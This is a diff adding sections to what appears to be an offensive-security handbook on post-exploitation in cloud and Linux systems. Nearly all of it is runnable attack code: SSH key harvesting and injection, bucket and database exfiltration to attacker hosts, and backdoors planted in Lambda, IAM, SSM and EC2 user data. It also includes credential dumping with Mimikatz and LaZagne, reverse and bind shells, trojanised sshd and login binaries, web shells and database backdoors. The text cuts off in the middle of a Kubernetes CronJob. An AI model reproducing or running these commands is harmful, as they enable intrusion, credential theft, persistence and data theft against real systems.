+#### SSH Key Harvesting and Injection
+
+```bash
+# Extract SSH keys from compromised instance
+find / -name "id_rsa" 2>/dev/null
+find / -name "id_ecdsa" 2>/dev/null
+find / -name "id_ed25519" 2>/dev/null
+
+# Copy authorized_keys
+cat /home/*/.ssh/authorized_keys
+cat /root/.ssh/authorized_keys
+
+# Inject attacker SSH key
+echo "ssh-rsa AAAA..." >> /home/ubuntu/.ssh/authorized_keys
+echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
+
+# Modify SSH config for persistence
+echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+systemctl restart sshd
+```
+
+### Data Exfiltration Tools
+
+#### Rclone (Cloud-to-Cloud Transfer)
+
+**Installation:**
+
+```bash
+curl https://rclone.org/install.sh | sudo bash
+
+# Or via apt
+sudo apt install rclone
+```
+
+**Basic Usage:**
+
+```bash
+# Configure source (AWS S3)
+rclone config
+
+# Quick setup with credentials
+rclone config create source s3 \
+    provider=AWS \
+    access_key_id=<key> \
+    secret_access_key=<secret>
+
+# Configure destination (attacker-controlled)
+rclone config create dest s3 \
+    provider=AWS \
+    access_key_id=<attacker-key> \
+    secret_access_key=<attacker-secret>
+
+# Copy data
+rclone copy source:bucket-name dest:exfil-bucket
+
+# Sync data
+rclone sync source:bucket-name dest:exfil-bucket
+
+# Mount remote bucket
+rclone mount source:bucket-name /mnt/s3 &
+
+# Bandwidth limiting (stealth)
+rclone copy source:bucket-name dest:exfil-bucket --bwlimit 1M
+
+# Background operation
+rclone copy source:bucket-name dest:exfil-bucket --log-file=/tmp/rclone.log &
+```
+
+**Advanced Options:**
+
+```bash
+# Encrypt during transfer
+rclone copy source:bucket dest:exfil --crypt-remote=encrypted:
+
+# Multi-threaded transfer
+rclone copy source:bucket dest:exfil --transfers=10
+
+# Only specific file types
+rclone copy source:bucket dest:exfil --include "*.{docx,xlsx,pdf}"
+
+# Exclude specific patterns
+rclone copy source:bucket dest:exfil --exclude "*.log"
+
+# Transfer with size limit
+rclone copy source:bucket dest:exfil --max-size 100M
+```
+
+#### S3Scanner for Bulk Downloads
+
+```bash
+# Download all accessible buckets from list
+python3 s3scanner.py --bucket-file accessible_buckets.txt --dump --threads 10
+
+# Download to specific directory
+python3 s3scanner.py --bucket target-bucket --dump --output-dir /tmp/exfil/
+
+# Selective download by extension
+python3 s3scanner.py --bucket target-bucket --dump --include-pattern "*.pdf"
+```
+
+#### AWS S3 Sync (Native Tool)
+
+```bash
+# Exfiltrate entire bucket
+aws s3 sync s3://target-bucket /tmp/exfil/
+
+# With bandwidth limiting (tc required)
+# First, limit network interface
+sudo tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms
+aws s3 sync s3://target-bucket /tmp/exfil/
+sudo tc qdisc del dev eth0 root
+
+# Parallel downloads
+aws s3 sync s3://target-bucket /tmp/exfil/ --max-concurrent-requests 20
+
+# Selective sync
+aws s3 sync s3://target-bucket /tmp/exfil/ --exclude "*" --include "*.docx"
+
+# To attacker-controlled bucket
+aws s3 sync s3://target-bucket s3://attacker-bucket --profile attacker
+```
+
+#### DynamoDB Data Exfiltration
+
+```bash
+# Scan entire table
+aws dynamodb scan --table-name <table-name> > table_data.json
+
+# Paginated scan for large tables
+aws dynamodb scan --table-name <table-name> \
+    --max-items 1000 \
+    --starting-token <token> > page1.json
+
+# Export to S3 (requires permissions)
+aws dynamodb export-table-to-point-in-time \
+    --table-arn <table-arn> \
+    --s3-bucket <bucket-name> \
+    --s3-prefix exports/
+
+# Convert to CSV
+jq -r '.Items[] | [.attribute1.S, .attribute2.N] | @csv' table_data.json > data.csv
+```
+
+### Persistence Tools
+
+#### Lambda Backdoor Persistence
+
+**Installation:**
+
+```bash
+git clone https://github.com/Voulnet/barq-aws-attack-tool.git
+cd barq-aws-attack-tool
+pip3 install -r requirements.txt
+```
+
+**Basic Usage:**
+
+```bash
+# Create backdoor Lambda
+python3 barq.py lambda-backdoor \
+    --function-name legitimate-function \
+    --payload-url http://attacker.com/payload.py
+
+# Create event-triggered backdoor
+python3 barq.py lambda-event-backdoor \
+    --event-source s3 \
+    --bucket target-bucket
+```
+
+**Manual Lambda Backdoor:**
+
+```bash
+# Create malicious Lambda function
+cat > backdoor.py << 'EOF'
+import json
+import boto3
+import urllib.request
+
+def lambda_handler(event, context):
+    # Beacon to attacker
+    urllib.request.urlopen('http://attacker.com/beacon?host=' + context.function_name)
+    
+    # Original functionality (to avoid detection)
+    return {
+        'statusCode': 200,
+        'body': json.dumps('Success')
+    }
+EOF
+
+# Package function
+zip backdoor.zip backdoor.py
+
+# Create or update Lambda
+aws lambda create-function \
+    --function-name backdoor-function \
+    --runtime python3.9 \
+    --role <role-arn> \
+    --handler backdoor.lambda_handler \
+    --zip-file fileb://backdoor.zip
+
+# Add trigger (e.g., API Gateway, S3, CloudWatch Events)
+aws lambda add-permission \
+    --function-name backdoor-function \
+    --statement-id AllowAPIGatewayInvoke \
+    --action lambda:InvokeFunction \
+    --principal apigateway.amazonaws.com
+```
+
+#### IAM Backdoor Users
+
+```bash
+# Create backdoor admin user
+aws iam create-user --user-name system-updater
+
+# Attach admin policy
+aws iam attach-user-policy \
+    --user-name system-updater \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Create access keys
+aws iam create-access-key --user-name system-updater
+
+# Alternative: Modify existing user
+aws iam create-access-key --user-name legitimate-user
+
+# Create hidden user (unusual name)
+aws iam create-user --user-name "aws:service:backup"
+```
+
+#### Backdoor IAM Roles
+
+```bash
+# Modify trust policy to allow external account
+cat > trust-policy.json << EOF
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Principal": {
+        "AWS": "arn:aws:iam::ATTACKER-ACCOUNT:root"
+      },
+      "Action": "sts:AssumeRole"
+    }
+  ]
+}
+EOF
+
+aws iam update-assume-role-policy \
+    --role-name TargetRole \
+    --policy-document file://trust-policy.json
+
+# Add inline policy to existing role
+cat > backdoor-policy.json << EOF
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": "*",
+      "Resource": "*"
+    }
+  ]
+}
+EOF
+
+aws iam put-role-policy \
+    --role-name TargetRole \
+    --policy-name BackdoorAccess \
+    --policy-document file://backdoor-policy.json
+```
+
+#### Systems Manager (SSM) Persistence
+
+```bash
+# Create SSM document for backdoor
+cat > backdoor-document.json << 'EOF'
+{
+  "schemaVersion": "2.2",
+  "description": "System maintenance script",
+  "mainSteps": [
+    {
+      "action": "aws:runShellScript",
+      "name": "runCommands",
+      "inputs": {
+        "runCommand": [
+          "curl http://attacker.com/backdoor.sh | bash"
+        ]
+      }
+    }
+  ]
+}
+EOF
+
+aws ssm create-document \
+    --name "SystemMaintenance" \
+    --document-type "Command" \
+    --content file://backdoor-document.json
+
+# Create association (automatic execution)
+aws ssm create-association \
+    --name "SystemMaintenance" \
+    --targets "Key=tag:Environment,Values=Production" \
+    --schedule-expression "cron(0 */6 * * ? *)"  # Every 6 hours
+```
+
+#### EC2 User Data Persistence
+
+```bash
+# Modify instance user data
+cat > userdata.sh << 'EOF'
+#!/bin/bash
+curl http://attacker.com/backdoor.sh | bash &
+# Original user data below...
+EOF
+
+aws ec2 modify-instance-attribute \
+    --instance-id <instance-id> \
+    --user-data file://userdata.sh
+
+# User data executes on instance restart
+aws ec2 reboot-instances --instance-ids <instance-id>
+```
+
+#### S3 Event Notification Backdoor
+
+```bash
+# Configure S3 event to trigger malicious Lambda
+aws s3api put-bucket-notification-configuration \
+    --bucket target-bucket \
+    --notification-configuration '{
+      "LambdaFunctionConfigurations": [
+        {
+          "LambdaFunctionArn": "arn:aws:lambda:region:account:function:backdoor",
+          "Events": ["s3:ObjectCreated:*"]
+        }
+      ]
+    }'
+```
+
+### Credential Dumping Tools
+
+#### Mimikatz (Windows EC2/Azure VMs)
+
+**Installation (on target Windows instance):**
+
+```powershell
+# Download Mimikatz
+Invoke-WebRequest -Uri "http://attacker.com/mimikatz.exe" -OutFile "C:\Windows\Temp\m.exe"
+
+# Or use PowerShell version
+IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
+```
+
+**Basic Usage:**
+
+```powershell
+# Standard credential dump
+.\m.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+
+# Export to file
+.\m.exe "privilege::debug" "sekurlsa::logonpasswords" > creds.txt
+
+# Dump SAM
+.\m.exe "privilege::debug" "lsadump::sam" "exit"
+
+# Dump LSA secrets
+.\m.exe "privilege::debug" "lsadump::secrets" "exit"
+
+# Export tickets (Kerberos)
+.\m.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
+
+# DCSync attack (if domain controller)
+.\m.exe "lsadump::dcsync /user:Administrator" "exit"
+```
+
+**Cloud-Specific Credential Locations:**
+
+```powershell
+# Check for cloud credentials
+Get-ChildItem Env: | Where-Object {$_.Name -like "*AWS*" -or $_.Name -like "*AZURE*"}
+
+# AWS credentials
+type C:\Users\*\.aws\credentials
+type C:\Users\*\.aws\config
+
+# Azure credentials
+type C:\Users\*\.azure\credentials
+type C:\Users\*\.azure\azureProfile.json
+
+# GCP credentials
+type C:\Users\*\AppData\Roaming\gcloud\credentials.db
+```
+
+#### LaZagne (Multi-Platform Password Recovery)
+
+**Installation:**
+
+```bash
+# Download latest release
+wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe  # Windows
+wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/laZagne.py   # Linux
+
+# Or clone repository
+git clone https://github.com/AlessandroZ/LaZagne.git
+cd LaZagne
+```
+
+**Basic Usage:**
+
+```bash
+# Linux
+python3 laZagne.py all
+
+# Specific modules
+python3 laZagne.py browsers
+python3 laZagne.py wifi
+python3 laZagne.py databases
+
+# Output to JSON
+python3 laZagne.py all -oJ
+
+# Verbose output
+python3 laZagne.py all -v
+
+# Windows (via wine or on target)
+wine lazagne.exe all
+```
+
+**Cloud Credential Extraction:**
+
+```bash
+# AWS CLI credentials
+python3 laZagne.py sysadmin -aws
+
+# Check for stored cloud credentials
+find ~/.aws ~/.azure ~/.config/gcloud -type f 2>/dev/null
+```
+
+#### secretsdump.py (Impacket)
+
+```bash
+# Dump SAM from remote Windows instance
+impacket-secretsdump administrator:password@<target-ip>
+
+# With NTLM hash
+impacket-secretsdump -hashes :<ntlm-hash> administrator@<target-ip>
+
+# Dump from local files (if extracted)
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+# DCSync (requires domain admin)
+impacket-secretsdump domain/administrator:password@<dc-ip> -just-dc-user krbtgt
+```
+
+### Container & Kubernetes Post-Exploitation
+
+#### kubectl (Kubernetes Access)
+
+```bash
+# If kubeconfig stolen/found
+export KUBECONFIG=/path/to/stolen/kubeconfig
+
+# List resources
+kubectl get pods --all-namespaces
+kubectl get secrets --all-namespaces
+kubectl get configmaps --all-namespaces
+
+# Extract secrets
+kubectl get secret <secret-name> -n <namespace> -o yaml
+kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data}'
+
+# Decode secret
+kubectl get secret <secret-name> -n <namespace> -o jsonpath='{.data.password}' | base64 -d
+
+# Execute commands in pod
+kubectl exec -it <pod-name> -n <namespace> -- /bin/bash
+
+# Port forwarding
+kubectl port-forward <pod-name> -n <namespace> 8080:80
+
+# Create backdoor pod
+cat > backdoor-pod.yaml << 'EOF'
+apiVersion: v1
+kind: Pod
+metadata:
+  name: backdoor
+  namespace: default
+spec:
+  containers:
+  - name: backdoor
+    image: attacker/backdoor:latest
+    command: ["/bin/bash", "-c", "while true; do sleep 30; done"]
+  hostNetwork: true
+  hostPID: true
+EOF
+
+kubectl apply -f backdoor-pod.yaml
+```
+
+#### Docker Escape Techniques
+
+```bash
+# Check if running in container
+cat /proc/1/cgroup | grep docker
+ls -la /.dockerenv
+
+# Check capabilities
+capsh --print
+
+# If CAP_SYS_ADMIN present
+mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
+echo 1 > /tmp/cgrp/memory.limit_in_bytes
+
+# Breakout via socket
+docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host bash
+
+# If docker.sock mounted
+curl --unix-socket /var/run/docker.sock http://localhost/containers/json
+```
+
+**Peirates** - Kubernetes penetration testing tool.
+
+**Installation:**
+
+```bash
+wget https://github.com/inguardians/peirates/releases/latest/download/peirates-linux-amd64.tar.xz
+tar -xvf peirates-linux-amd64.tar.xz
+chmod +x peirates
+```
+
+**Basic Usage:**
+
+```bash
+# Run peirates
+./peirates
+
+# Once inside:
+# 1. Establish service account credentials
+# 2. Enumerate pods and services
+# 3. Steal secrets
+# 4. Establish persistence
+# 5. Pivot to other pods/nodes
+```
+
+---
+
+**Important Related Topics:**
+
+- **Cloud Security Monitoring Evasion**: Advanced techniques for avoiding detection in CloudWatch, GuardDuty, Security Hub
+- **Serverless Exploitation**: Lambda, Azure Functions, Cloud Run specific attack vectors
+- **Container Registry Poisoning**: Compromising ECR, ACR, GCR images
+- **Cloud API Abuse**: Rate limiting bypass, API throttling evasion
+- **Cross-Account Exploitation**: Assuming roles across AWS accounts, Azure subscription hopping
+- **Cloud Ransomware Operations**: Encryption strategies for S3, EBS, Azure Blob Storage
+- **Covert Channels in Cloud**: DNS tunneling, ICMP exfiltration through cloud firewalls
 
 ---
 
@@ -31055,7 +43013,751 @@ tar czf - /sensitive | nc localhost 9999
 nc -lvnp 9999 > exfiltrated_data.tar.gz
 ```
 
-**HTTP Tunnel
+**HTTP Tunnel Exfiltration**
+
+```bash
+# Using httptunnel
+# On attacker
+hts -F localhost:4444 8080
+
+# On target
+htc -F 4444 attacker-ip:8080
+tar czf - /sensitive | nc localhost 4444
+
+# Using chisel for HTTP tunneling
+# On attacker
+chisel server --port 8000 --reverse
+
+# On target
+chisel client attacker-ip:8000 R:4444:localhost:4444
+tar czf - /data | nc localhost 4444
+```
+
+**DNS Tunneling Tools**
+
+```bash
+# Using dnscat2
+# On attacker
+dnscat2 --dns server=attacker.com
+
+# On target
+./dnscat attacker.com
+# Then within dnscat session
+download /etc/shadow
+upload payload.sh /tmp/
+
+# Using iodine for DNS tunnel
+# On attacker (requires DNS server control)
+iodined -f 10.0.0.1 exfil.attacker.com
+
+# On target
+iodine -f attacker-dns-server exfil.attacker.com
+# Creates tunnel interface, use for data transfer
+scp -o ProxyCommand="nc -X connect -x 10.0.0.1:1080 %h %p" file.txt user@attacker-internal-ip:/tmp/
+```
+
+### Email Exfiltration
+
+```bash
+# SMTP exfiltration
+tar czf - /sensitive | base64 | mail -s "System Backup $(date)" attacker@example.com
+
+# Using sendmail
+cat > email_exfil.sh << 'EOF'
+#!/bin/bash
+FILE="$1"
+TO="attacker@example.com"
+SUBJECT="Data Package $(date +%s)"
+
+(
+echo "To: $TO"
+echo "Subject: $SUBJECT"
+echo "Content-Type: text/plain"
+echo ""
+base64 "$FILE"
+) | sendmail -t
+EOF
+
+# Multiple file email exfiltration
+for file in /home/user/sensitive/*; do
+    uuencode "$file" "$(basename $file)" | mail -s "File: $(basename $file)" attacker@example.com
+    sleep 60
+done
+```
+
+### FTP/SFTP Exfiltration
+
+```bash
+# Anonymous FTP upload
+curl -T sensitive.tar.gz ftp://attacker-ftp-server/ --user anonymous:
+
+# Authenticated FTP
+curl -T database.sql ftp://attacker-ftp-server/uploads/ --user username:password
+
+# SFTP exfiltration
+sftp attacker-user@attacker-host << EOF
+cd /incoming
+put /etc/shadow
+put /home/user/.ssh/id_rsa
+bye
+EOF
+
+# Batch SFTP upload
+cat > sftp_batch.txt << 'EOF'
+cd /exfil
+put /etc/passwd
+put /etc/shadow
+put /root/.ssh/id_rsa
+bye
+EOF
+sftp -b sftp_batch.txt user@attacker-host
+```
+
+### Database Exfiltration
+
+**Direct Database Dumps**
+
+```bash
+# MySQL dump and exfiltrate
+mysqldump -u root -p'password' --all-databases | gzip | base64 | curl -X POST -d @- http://attacker.com/db
+
+# PostgreSQL dump
+pg_dumpall -U postgres | gzip | curl -X POST -F "file=@-" http://attacker.com/upload
+
+# MongoDB dump
+mongodump --out=/tmp/mongo_backup
+tar czf - /tmp/mongo_backup | curl -X POST -d @- http://attacker.com/mongo
+
+# SQLite database exfiltration
+for db in $(find / -name "*.db" 2>/dev/null); do
+    curl -X POST -F "file=@$db" -F "path=$db" http://attacker.com/sqlite
+done
+```
+
+**Database Query Exfiltration**
+
+```bash
+# Extract specific tables via SQL queries
+mysql -u root -p'password' -e "SELECT * FROM users.credentials" | \
+    base64 | curl -X POST -d @- http://attacker.com/data
+
+# PostgreSQL with output to file
+psql -U postgres -c "COPY (SELECT * FROM sensitive_table) TO STDOUT CSV" | \
+    curl -X POST -F "file=@-" http://attacker.com/upload
+```
+
+### Git Repository Exfiltration
+
+```bash
+# Clone entire repository
+cd /tmp
+git clone --mirror /var/www/application/.git
+tar czf repo.tar.gz application.git
+curl -X POST -F "file=@repo.tar.gz" http://attacker.com/repos
+
+# Extract git history with secrets
+cd /path/to/repo
+git log --all --full-history --pretty=format:"%H" | while read commit; do
+    git show $commit | grep -iE "(password|key|token|secret)" > /tmp/secrets_$commit.txt
+done
+tar czf - /tmp/secrets_*.txt | curl -X POST -d @- http://attacker.com/git-secrets
+
+# Dump git configuration
+cat .git/config | curl -X POST -d @- http://attacker.com/git-config
+```
+
+### Archive and Compression for Exfiltration
+
+```bash
+# Create encrypted archive
+tar czf - /sensitive | openssl enc -aes-256-cbc -salt -k "password" > encrypted.tar.gz.enc
+curl -X POST -F "file=@encrypted.tar.gz.enc" http://attacker.com/secure
+
+# Split large files for exfiltration
+tar czf - /large/dataset | split -b 10M - chunk_
+for chunk in chunk_*; do
+    curl -X POST -F "file=@$chunk" http://attacker.com/chunks/$(hostname)/
+    rm $chunk
+    sleep 30
+done
+
+# Password-protected ZIP
+zip -e -r sensitive.zip /home/user/documents
+# Enter password when prompted
+curl -X POST -F "file=@sensitive.zip" http://attacker.com/zips
+```
+
+### Living off the Land Exfiltration
+
+```bash
+# Using curl (commonly available)
+cat /etc/shadow | curl -X POST -d @- http://attacker.com/data
+
+# Using wget
+tar czf - /sensitive | wget --post-file=- http://attacker.com/upload -O -
+
+# Using Python (if available)
+python3 -c "import requests; requests.post('http://attacker.com/upload', files={'file': open('/etc/passwd', 'rb')})"
+
+# Using Perl
+perl -MHTTP::Request::Common -MLWP::UserAgent -e \
+    'LWP::UserAgent->new->request(POST "http://attacker.com/upload", Content_Type => "form-data", Content => [file => ["/etc/shadow"]])'
+
+# Using Ruby
+ruby -rnet/http -e 'Net::HTTP.post_form(URI("http://attacker.com/upload"), {"data" => File.read("/etc/passwd")})'
+```
+
+### Slow Exfiltration (Evading Rate Limits)
+
+```bash
+# Time-delayed exfiltration
+cat sensitive.txt | base64 | fold -w 100 | while read line; do
+    curl -X POST -d "data=$line" http://attacker.com/slow
+    sleep $((60 + RANDOM % 120))  # Random delay 60-180 seconds
+done
+
+# Scheduled exfiltration via cron
+cat > /tmp/slow_exfil.sh << 'EOF'
+#!/bin/bash
+FILE="/etc/shadow"
+CHUNK_SIZE=1000
+POSITION=$(cat /tmp/exfil_position 2>/dev/null || echo 0)
+
+DATA=$(tail -c +$POSITION "$FILE" | head -c $CHUNK_SIZE | base64)
+if [ -n "$DATA" ]; then
+    curl -X POST -d "data=$DATA&pos=$POSITION" http://attacker.com/incremental
+    echo $((POSITION + CHUNK_SIZE)) > /tmp/exfil_position
+fi
+EOF
+chmod +x /tmp/slow_exfil.sh
+(crontab -l; echo "*/30 * * * * /tmp/slow_exfil.sh") | crontab -
+```
+
+## Backdoor Creation
+
+Backdoors provide alternative access mechanisms independent of the original compromise vector, ensuring access persistence even if initial vulnerabilities are patched.
+
+### Binary Backdoors
+
+**Backdoored System Binaries**
+
+```bash
+# Backdoor SSH binary
+cp /usr/sbin/sshd /usr/sbin/sshd.bak
+
+cat > sshd_wrapper.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+int main(int argc, char **argv) {
+    char *password = getenv("SSH_PASSWORD");
+    
+    if (password && strcmp(password, "BackdoorPass123") == 0) {
+        setuid(0);
+        setgid(0);
+        execl("/bin/bash", "bash", "-i", NULL);
+        exit(0);
+    }
+    
+    execv("/usr/sbin/sshd.bak", argv);
+    return 0;
+}
+EOF
+
+gcc -o /usr/sbin/sshd sshd_wrapper.c
+chmod +x /usr/sbin/sshd
+
+# Access: SSH_PASSWORD=BackdoorPass123 ssh user@target
+```
+
+**Backdoored Login Binary**
+
+```bash
+# Intercept login credentials
+cp /bin/login /bin/login.bak
+
+cat > login_wrapper.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+int main(int argc, char **argv) {
+    // Log credentials before passing to real login
+    FILE *fp = fopen("/var/log/.credentials", "a");
+    if (fp) {
+        fprintf(fp, "User: %s, Time: %ld\n", getenv("USER"), time(NULL));
+        fclose(fp);
+    }
+    
+    // Check for backdoor password
+    char *pass = getenv("PASSWORD");
+    if (pass && strcmp(pass, "MasterKey123") == 0) {
+        setuid(0);
+        execl("/bin/bash", "bash", NULL);
+    }
+    
+    execv("/bin/login.bak", argv);
+    return 0;
+}
+EOF
+
+gcc -o /bin/login login_wrapper.c
+```
+
+**Shared Library Injection**
+
+```bash
+# Create malicious shared library
+cat > evil.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor))
+void init() {
+    if (getuid() == 0) {
+        system("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' &");
+    }
+}
+EOF
+
+gcc -shared -fPIC -o evil.so evil.c
+
+# Inject via LD_PRELOAD
+echo "/tmp/evil.so" >> /etc/ld.so.preload
+
+# Or inject via LD_LIBRARY_PATH in service
+echo 'Environment="LD_PRELOAD=/tmp/evil.so"' >> /etc/systemd/system/some-service.service
+```
+
+### Network Service Backdoors
+
+**Bind Shell Backdoor**
+
+```bash
+# Simple bind shell
+cat > bind_shell.sh << 'EOF'
+#!/bin/bash
+while true; do
+    nc -lvnp 12345 -e /bin/bash
+    sleep 5
+done
+EOF
+chmod +x bind_shell.sh
+nohup /tmp/bind_shell.sh &
+
+# Using socat for encrypted bind shell
+socat OPENSSL-LISTEN:4443,cert=server.pem,verify=0,fork EXEC:/bin/bash &
+
+# Python bind shell
+python3 -c "
+import socket,subprocess,os
+s=socket.socket()
+s.bind(('0.0.0.0',12345))
+s.listen(1)
+while True:
+    c,a=s.accept()
+    os.dup2(c.fileno(),0)
+    os.dup2(c.fileno(),1)
+    os.dup2(c.fileno(),2)
+    subprocess.call(['/bin/bash','-i'])
+" &
+```
+
+**Reverse Shell Backdoor**
+
+```bash
+# Persistent reverse shell service
+cat > /etc/systemd/system/system-health.service << 'EOF'
+[Unit]
+Description=System Health Monitor
+After=network.target
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=120
+ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/attacker.com/4444 0>&1; sleep 300; done'
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl daemon-reload
+systemctl enable system-health.service
+systemctl start system-health.service
+
+# Cron-based reverse shell
+(crontab -l; echo "*/15 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -
+```
+
+**Port Knocking Backdoor**
+
+```bash
+# Install knockd
+apt-get install knockd -y
+
+# Configure port knock sequence
+cat > /etc/knockd.conf << 'EOF'
+[options]
+    UseSyslog
+
+[openSSH]
+    sequence    = 7000,8000,9000
+    seq_timeout = 10
+    command     = /usr/sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+    tcpflags    = syn
+
+[closeSSH]
+    sequence    = 9000,8000,7000
+    seq_timeout = 10
+    command     = /usr/sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+    tcpflags    = syn
+
+[backdoor]
+    sequence    = 1337,31337,8080
+    seq_timeout = 15
+    command     = /bin/bash -c 'bash -i >& /dev/tcp/%IP%/4444 0>&1' &
+    tcpflags    = syn
+EOF
+
+# Start knockd
+systemctl enable knockd
+systemctl start knockd
+
+# Activate from attacker: knock target 1337 31337 8080
+```
+
+### Web-Based Backdoors
+
+**PHP Backdoor with Authentication**
+
+```bash
+cat > /var/www/html/includes/config.php.bak << 'EOF'
+<?php
+// Legitimate-looking config file
+define('DB_HOST', 'localhost');
+define('DB_USER', 'webapp');
+define('DB_PASS', 'password');
+
+// Backdoor functionality
+if (isset($_SERVER['HTTP_X_AUTH_TOKEN']) && 
+    md5($_SERVER['HTTP_X_AUTH_TOKEN']) === '5f4dcc3b5aa765d61d8327deb882cf99') {
+    
+    if (isset($_POST['cmd'])) {
+        echo '<pre>' . shell_exec($_POST['cmd']) . '</pre>';
+    }
+    
+    if (isset($_FILES['file'])) {
+        move_uploaded_file($_FILES['file']['tmp_name'], 
+                          '/tmp/' . $_FILES['file']['name']);
+    }
+    exit;
+}
+?>
+EOF
+
+# Access with: curl -H "X-Auth-Token: password" -X POST -d "cmd=whoami" http://target/includes/config.php.bak
+```
+
+**Polyglot Backdoor (Image + PHP)**
+
+```bash
+# Create image with embedded PHP
+cat image.jpg > backdoor.jpg
+echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' >> backdoor.jpg
+
+# Upload as image, access with .php extension or via include vulnerability
+curl http://target/uploads/backdoor.jpg?c=whoami
+```
+
+**JSP Backdoor**
+
+```bash
+cat > /var/lib/tomcat9/webapps/ROOT/admin/system.jsp << 'EOF'
+<%@ page import="java.io.*" %>
+<%
+    String cmd = request.getParameter("cmd");
+    if (cmd != null && request.getHeader("X-Auth").equals("SecretKey123")) {
+        Process p = Runtime.getRuntime().exec(cmd);
+        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        while ((line = br.readLine()) != null) {
+            out.println(line + "<br>");
+        }
+    }
+%>
+EOF
+
+# Access: curl -H "X-Auth: SecretKey123" "http://target/admin/system.jsp?cmd=whoami"
+```
+
+**ASP.NET Backdoor**
+
+```bash
+cat > /var/www/html/admin/config.aspx << 'EOF'
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%
+    if (Request.Headers["X-Key"] == "BackdoorKey") {
+        string cmd = Request.QueryString["cmd"];
+        Process p = new Process();
+        p.StartInfo.FileName = "cmd.exe";
+        p.StartInfo.Arguments = "/c " + cmd;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.StartInfo.UseShellExecute = false;
+        p.Start();
+        Response.Write(p.StandardOutput.ReadToEnd());
+    }
+%>
+EOF
+```
+
+### Database Backdoors
+
+**MySQL Backdoor User**
+
+```bash
+# Create backdoor admin user
+mysql -u root -p'password' << 'EOF'
+CREATE USER 'sysadmin'@'%' IDENTIFIED BY 'ComplexPass123!';
+GRANT ALL PRIVILEGES ON *.* TO 'sysadmin'@'%' WITH GRANT OPTION;
+FLUSH PRIVILEGES;
+EOF
+
+# Backdoor via trigger
+mysql -u root -p'password' << 'EOF'
+USE mysql;
+DELIMITER //
+CREATE TRIGGER backdoor_trigger
+BEFORE INSERT ON user
+FOR EACH ROW
+BEGIN
+    DECLARE cmd VARCHAR(255);
+    SET cmd = 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &';
+    SELECT sys_exec(cmd);
+END//
+DELIMITER ;
+EOF
+```
+
+**PostgreSQL Backdoor**
+
+```bash
+# Create backdoor function
+psql -U postgres << 'EOF'
+CREATE OR REPLACE FUNCTION system(cstring) RETURNS integer AS 
+'/lib/x86_64-linux-gnu/libc.so.6', 'system' 
+LANGUAGE 'c' STRICT;
+
+CREATE OR REPLACE FUNCTION backdoor(text) RETURNS text AS $$
+BEGIN
+    PERFORM system($1);
+    RETURN 'executed';
+END;
+$$ LANGUAGE plpgsql;
+
+-- Grant execute to public or specific user
+GRANT EXECUTE ON FUNCTION backdoor(text) TO public;
+EOF
+
+# Execute: SELECT backdoor('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &');
+```
+
+**MongoDB Backdoor**
+
+```bash
+# Create administrative user
+mongo admin << 'EOF'
+db.createUser({
+    user: "backup",
+    pwd: "SecureBackupPass123",
+    roles: [{role: "root", db: "admin"}]
+});
+EOF
+
+# Store backdoor payload in collection
+mongo admin << 'EOF'
+db.system.js.save({
+    _id: "backdoor",
+    value: function(cmd) {
+        return run("bash", "-c", cmd);
+    }
+});
+EOF
+```
+
+### Container Backdoors
+
+**Docker Container Backdoor**
+
+```bash
+# Create backdoored container
+cat > Dockerfile << 'EOF'
+FROM alpine:latest
+RUN apk add --no-cache bash netcat-openbsd
+COPY backdoor.sh /usr/local/bin/
+RUN chmod +x /usr/local/bin/backdoor.sh
+CMD ["/usr/local/bin/backdoor.sh"]
+EOF
+
+cat > backdoor.sh << 'EOF'
+#!/bin/bash
+while true; do
+    bash -i >& /dev/tcp/attacker.com/4444 0>&1
+    sleep 300
+done
+EOF
+
+docker build -t system-monitor:latest .
+docker run -d --name monitor --restart always system-monitor:latest
+
+# Backdoor via docker exec in existing container
+docker exec -d existing-container bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &'
+```
+
+**Kubernetes CronJob Backdoor**
+
+```bash
+cat > backdoor-cronjob.yaml << 'EOF'
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: system-maintenance
+  namespace: kube-system
+spec:
+  schedule: "*/30 * * * *"
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          hostNetwork: true
+          hostPID: true
+          containers:
+          - name: maintenance
+            image: alpine:latest
+            command:
+            - /bin/sh
+            - -c
+            - |
